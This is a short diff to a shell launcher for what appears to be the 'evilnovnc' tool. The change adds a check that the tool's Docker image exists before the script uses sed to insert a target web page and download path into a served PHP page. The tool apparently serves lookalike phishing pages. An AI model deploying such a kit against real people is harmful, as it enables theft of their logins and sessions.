@@ -30,11 +30,16 @@ WEBPAGE=$1
 
 
 path=$(pwd)
-printf "\n\e[1;33m[>]Preparando nginx..."
+printf "\n\e[1;33m[>]Preparando nginx...\n"
 cd Files
 cp index.php index_tmp.php
 cp index.html index_tmp.html
 id_image=$(sudo docker images evilnovnc -q)
+if [ -z $id_image ]; then
+    printf "\e[1;31m[!] Image 'evilnovnc' not found!\n\n"
+    exit 1
+fi
+
 sed -i'' -e "s,webpage,$WEBPAGE,g" index_tmp.php
 sed -i'' -e "s,idimage,$id_image,g" index_tmp.php
 sed -i'' -e "s,download_string,$path/Downloads,g" index_tmp.php
